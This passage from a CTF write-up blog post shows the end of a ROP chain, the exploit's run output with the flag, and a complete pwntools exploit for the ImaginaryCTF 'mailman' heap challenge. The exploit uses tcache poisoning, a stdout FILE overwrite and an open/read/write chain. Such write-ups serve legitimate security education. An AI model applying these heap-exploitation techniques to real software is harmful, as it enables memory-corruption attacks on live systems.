rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_open, rdi<span style="color:#ff79c6">=</span>stack <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xde</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span>, rsi<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4"># open</span>
rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_read, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>, rsi<span style="color:#ff79c6">=</span>(stack <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xfff</span>), rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x300</span>) <span style="color:#6272a4"># file descriptor bf ...</span>
rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))

rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_write, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, rsi<span style="color:#ff79c6">=</span>(stack <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xfff</span>), rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x50</span>) <span style="color:#6272a4"># write</span>
rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
rop<span style="color:#ff79c6">.</span>raw(<span style="color:#f1fa8c">&#34;./flag.txt</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)

<span style="color:#6272a4"># victim =&gt; tcache</span>
free(<span style="color:#bd93f9">8</span>) 

<span style="color:#6272a4"># prev =&gt; tcache 0x140</span>
free(<span style="color:#bd93f9">7</span>) 

<span style="color:#6272a4"># tcache poisoning</span>
add(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">0x130</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x100</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(((stack <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x28</span>) <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2b90</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))))
add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>) <span style="color:#6272a4"># dumb</span>

<span style="color:#8be9fd;font-style:italic">print</span>(rop<span style="color:#ff79c6">.</span>dump())
add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x100</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x1337</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">5</span> <span style="color:#ff79c6">+</span> rop<span style="color:#ff79c6">.</span>chain())

io<span style="color:#ff79c6">.</span>interactive()
</code></pre></div><p>Which gives:</p>
<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=mailman.chal.imaginaryctf.org PORT=1337
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/vuln'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mailman.chal.imaginaryctf.org on port 1337: Done
[*] heap @ 0x5611bbf93000
[+] libc: 0x7f6b49fec000
[+] environ: 0x7f6b4a2932d8
[+] stdout: 0x7f6b4a206780
[*] stack: 0x7fff28533ba8
[*] Loaded 218 cached gadgets for '/home/nasm/Documents/pwn/ImaginaryCTF/mailman/libc.so.6'
[*] Switching to interactive mode
ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
</code></pre><h1 id="annexes">Annexes</h1>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>

<span style="color:#6272a4"># this exploit was generated via</span>
<span style="color:#6272a4"># 1) pwntools</span>
<span style="color:#6272a4"># 2) ctfmate</span>

<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> time
<span style="color:#ff79c6">import</span> pwn

BINARY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;vuln&#34;</span>
LIBC <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/libc.so.6&#34;</span>
LD <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/alexis/Documents/pwn/ImaginaryCTF/mailman/ld-linux-x86-64.so.2&#34;</span>

<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(BINARY)
libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LIBC)
ld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LD)
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;tmux&#34;</span>, <span style="color:#f1fa8c">&#34;splitw&#34;</span>, <span style="color:#f1fa8c">&#34;-h&#34;</span>]
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>timeout <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span>
p64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64
u64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64
p32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32
u32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u32
p16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p16
u16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u16
p8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p8
u8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u8

host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
    <span style="color:#ff79c6">return</span> io


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)


gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
</span><span style="color:#f1fa8c">source ~/Downloads/pwndbg/gdbinit.py
</span><span style="color:#f1fa8c">b* main
</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exp</span>():
    io <span style="color:#ff79c6">=</span> start()

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(idx, size, data, noLine<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;idx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;size: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size)<span style="color:#ff79c6">.</span>encode())
        
        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> noLine:
            io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;content: &#34;</span>, data)
        <span style="color:#ff79c6">else</span>:
            io<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;content: &#34;</span>, data)

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">view</span>(idx):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;idx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">free</span>(idx):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;idx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())

    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
        add(i, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)

    <span style="color:#6272a4"># leak</span>

    free(<span style="color:#bd93f9">0</span>)
    view(<span style="color:#bd93f9">0</span>)

    heap <span style="color:#ff79c6">=</span> ((pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2000</span>)
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap @ </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>)

    add(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># prev</span>
    add(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># a</span>

    <span style="color:#6272a4"># fill tcache</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
        free(i)

    <span style="color:#ff79c6">for</span> _ <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">20</span>):
        add(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># barrier</span>

    free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; unsortedbin</span>
    free(<span style="color:#bd93f9">7</span>) <span style="color:#6272a4"># free(prev) =&gt; merged with a</span>

    <span style="color:#6272a4"># leak libc</span>
    view(<span style="color:#bd93f9">8</span>)

    libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recvline()[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span> <span style="color:#6272a4"># offset of the unsorted bin</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    stdout <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21a780</span>
    environ <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2a72d0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span>
    strr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1bd460</span>

    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stdout: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stdout)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    add(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;YY&#34;</span>) <span style="color:#6272a4"># pop a chunk from the tcache to let an entry left to a </span>
    free(<span style="color:#bd93f9">8</span>) <span style="color:#6272a4"># free(a) =&gt; tcache</span>

    <span style="color:#6272a4"># unsortedbin =&gt; oob on a =&gt; tcache poisoning</span>
    add(
        <span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x130</span>, pwn<span style="color:#ff79c6">.</span>flat(
                            <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x108</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>),
                           (stdout) <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2b90</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>)
                           )
        )
    add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>)

    <span style="color:#6272a4"># tcache =&gt; stdout</span>
    add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x100</span>, pwn<span style="color:#ff79c6">.</span>flat(<span style="color:#bd93f9">0xfbad1800</span>, <span style="color:#6272a4"># _flags</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_ptr</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_end</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_read_base</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ, <span style="color:#6272a4"># _IO_write_base</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_write_ptr</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_write_end</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x8</span>, <span style="color:#6272a4"># _IO_buf_base</span>
                           libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">8</span> <span style="color:#6272a4"># _IO_buf_end</span>
                           )
        )

    stack <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x160</span> <span style="color:#6272a4"># stackframe of fgets</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stack: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stack)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc, base<span style="color:#ff79c6">=</span>stack)

    <span style="color:#6272a4"># ROPchain</span>
    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_open, rdi<span style="color:#ff79c6">=</span>stack <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xde</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x18</span>, rsi<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4"># open</span>
    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_read, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>, rsi<span style="color:#ff79c6">=</span>(stack <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xfff</span>), rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x300</span>) <span style="color:#6272a4"># file descriptor bf ...</span>
    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))

    rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_write, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, rsi<span style="color:#ff79c6">=</span>(stack <span style="color:#ff79c6">&amp;</span> <span style="color:#ff79c6">~</span><span style="color:#bd93f9">0xfff</span>), rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x50</span>) <span style="color:#6272a4"># write</span>
    rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
    rop<span style="color:#ff79c6">.</span>raw(<span style="color:#f1fa8c">&#34;./flag.txt</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)

    <span style="color:#6272a4"># victim =&gt; tcache</span>
    free(<span style="color:#bd93f9">8</span>) 
    
    <span style="color:#6272a4"># prev =&gt; tcache 0x140</span>
    free(<span style="color:#bd93f9">7</span>) 

    <span style="color:#6272a4"># tcache poisoning</span>
    add(<span style="color:#bd93f9">5</span>, <span style="color:#bd93f9">0x130</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;T&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x100</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x111</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(((stack <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x28</span>) <span style="color:#ff79c6">^</span> ((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2b90</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>))))
    add(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;TT&#34;</span>) <span style="color:#6272a4"># dumb</span>

    <span style="color:#8be9fd;font-style:italic">print</span>(rop<span style="color:#ff79c6">.</span>dump())
    add(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0x100</span>, pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x1337</span>)<span style="color:#ff79c6">*</span><span style="color:#bd93f9">5</span> <span style="color:#ff79c6">+</span> rop<span style="color:#ff79c6">.</span>chain())

    io<span style="color:#ff79c6">.</span>interactive()

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    exp()
</code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
